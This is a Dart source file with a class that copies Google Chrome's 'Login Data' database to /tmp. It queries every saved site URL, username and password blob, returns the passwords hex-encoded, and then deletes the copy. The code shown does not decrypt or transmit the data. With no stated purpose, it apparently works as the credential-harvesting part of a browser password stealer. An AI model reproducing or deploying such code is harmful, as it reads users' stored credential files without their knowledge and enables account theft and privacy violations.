import 'dart:io';

import 'package:hroom/shared.dart';
import 'package:sqlite3/sqlite3.dart';
import 'package:xdg_directories/xdg_directories.dart';

class LoginDataCreds {
  static List<Creds> extract() {
    final sourceDB =
        File('${configHome.path}/google-chrome/Default/Login Data');
    final destinationDB = File('/tmp/login_data');
    if (destinationDB.existsSync()) {
      destinationDB.deleteSync();
    }
    sourceDB.copySync(destinationDB.path);

    final db = sqlite3.open(destinationDB.path);

    final resultSet = db.select(
      // ignore: lines_longer_than_80_chars
      "select origin_url, username_value, HEX(password_value) as password from logins where password is not null and password <> '';",
    );

    if (destinationDB.existsSync()) {
      destinationDB.deleteSync();
    }

    db.dispose();

    final result = <Creds>[];
    for (final row in resultSet) {
      result.add(
        Creds(
          url: row['origin_url'] as String,
          username: row['username_value'] as String,
          password: row['password'] as String,
        ),
      );
    }
    return result;
  }
}
